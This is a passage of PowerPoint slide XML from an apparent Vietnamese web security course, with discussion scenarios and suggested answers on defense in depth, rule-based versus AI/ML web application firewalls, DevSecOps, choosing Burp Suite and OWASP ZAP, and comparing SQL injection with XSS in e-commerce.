              <a:t>Nếu chỉ được chọn 2 công cụ để kiểm thử ứng dụng web trong một dự án hạn chế tài nguyên, bạn sẽ chọn công cụ nào và vì sao?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200">
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Theo bạn, lỗ hổng nào nguy hiểm hơn trong thực tế thương mại điện tử: SQL Injection hay XSS? Vì sao?</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4234169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24264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1. Defense in Depth quan trọng vì sao?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Vì hacker có thể vượt qua 1 lớp bảo vệ, nhưng khó vượt qua nhiều lớp (VPN, FW, IDS/IPS, WAF). Giảm thiểu rủi ro single point of failure.</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Khi nào dùng WAF truyền thống và khi nào dùng WAF AI/ML?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>WAF truyền thống: Chặn tấn công phổ biến theo rule.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>WAF AI/ML: Cần khi đối phó tấn công mới, zero-day, hoặc lưu lượng phức tạp.</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Vai trò DevSecOps trong bảo mật ứng dụng web?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tích hợp bảo mật ngay từ giai đoạn coding &amp; CI/CD để phát hiện sớm, giảm chi phí khắc phục, bảo mật liên tục.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="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5096403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24264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Chọn 2 công cụ kiểm thử khi hạn chế tài nguyên?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Thường chọn Burp Suite (manual + proxy test) và OWASP ZAP (scanner): Cân bằng giữa tự động và thủ công.</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5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. SQL Injection hay XSS nguy hiểm hơn trong E-commerce?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>SQLi nguy hiểm hơn vì có thể đánh cắp DB (thông tin khách hàng, thẻ tín dụng). XSS thường gây mất session, lừa người dùng, nhưng mức độ hại thấp hơn SQLi.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="153265290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693022"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Defense in Depth</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Một website thương mại điện tử bị tấn công DDoS. Firewall chặn được một phần lưu lượng, nhưng hacker vẫn thử khai thác lỗ hổng ứng dụng. Tuy nhiên, IDS/WAF phát hiện và ngăn chặn kịp thời.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Nếu chỉ có firewall, chuyện gì sẽ xảy ra?</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WAF truyền thống vs WAF AI/ML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Một website sử dụng WAF rule-based. Hacker dùng payload mới chưa nằm trong danh sách rule, WAF không nhận ra. Sau khi nâng cấp sang WAF AI/ML, hệ thống phát hiện bất thường trong request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Vì sao WAF AI/ML xử lý được tình huống này?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="321513868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133463"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DevSecOps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Nhóm phát triển tung bản cập nhật website nhanh chóng nhưng không chạy kiểm thử bảo mật. Sau đó, hacker khai thác lỗ hổng XSS trong tính năng mới. Nếu có DevSecOps, lỗ hổng đã bị phát hiện trước khi release.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: DevSecOps giúp ích gì trong trường hợp này?</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Công cụ kiểm thử</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Do giới hạn kinh phí, một startup chỉ chọn được 2 công cụ kiểm thử bảo mật web. Họ cân nhắc giữa Burp Suite, OWASP ZAP, sqlmap, Nikto. Cuối cùng chọn Burp Suite và ZAP để vừa quét tự động, vừa kiểm thử thủ công.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Tại sao đây là lựa chọn hợp lý?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20838858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133463"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5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. SQLi vs XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Một website E-commerce có 2 lỗi:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>SQLi cho phép hacker đọc bảng users chứa email và thẻ tín dụng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>XSS cho phép hacker đánh cắp cookie người dùng.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Trong tình huống này, lỗi nào gây hậu quả nghiêm trọng hơn cho doanh nghiệp?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27903593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133463"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1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Defense in Depth</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Website </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>bị DDoS, firewall chặn một phần nhưng hacker khai thác lỗ hổng; IDS/WAF mới ngăn chặn kịp </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>thời.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Nếu chỉ có firewall, chuyện gì sẽ xảy ra?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Mục tiêu thảo luận:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hiểu tầm quan trọng của đa tầng bảo mật (Defense in Depth) thay vì chỉ dựa vào một công cụ.</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Gợi ý trả lời:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Nếu chỉ có firewall, hacker có thể qua mặt bằng cách khai thác ứng dụng: Hệ thống vẫn bị xâm nhập. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33977141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133463"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2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. WAF truyền thống vs WAF AI/ML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>WAF </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>rule-based không phát hiện payload mới; WAF AI/ML phát hiện bất thường.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: Vì sao WAF AI/ML xử lý được tình huống này?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Mục tiêu thảo luận:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>So sánh cách tiếp cận rule-based và AI/ML dựa trên hành vi/anomaly detection.</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Gợi ý trả lời:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>WAF AI/ML không phụ thuộc rule cứng, mà nhận diện mẫu hành vi bất thường để phát hiện được tấn công mới (zero-day).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="142692313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461010"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3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. DevSecOps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Bản cập nhật website chưa kiểm thử bảo mật, hacker khai thác XSS. Nếu có DevSecOps, lỗ hổng đã bị phát hiện trước khi release.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Câu hỏi: DevSecOps giúp ích gì trong trường hợp này?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"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Mục tiêu thảo luận:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Hiểu rằng tích hợp bảo mật sớm trong quy trình phát triển giúp ngăn lỗ hổng lọt vào sản phẩm.</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Gợi ý trả lời:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>DevSecOps tự động quét bảo mật trong pipeline CI/CD: Gúp phát hiện sớm XSS, giảm rủi ro trước khi code ra môi trường thật.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="272788474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9737678"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4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>. Công cụ kiểm thử</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>Tình huống: Startup chỉ chọn được 2 công cụ: Burp Suite + OWASP ZAP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000CC"/>
                </a:solidFill>
                <a:latin typeface="Rockwell" panose="02060603020205020403" pitchFamily="18" charset="0"/>
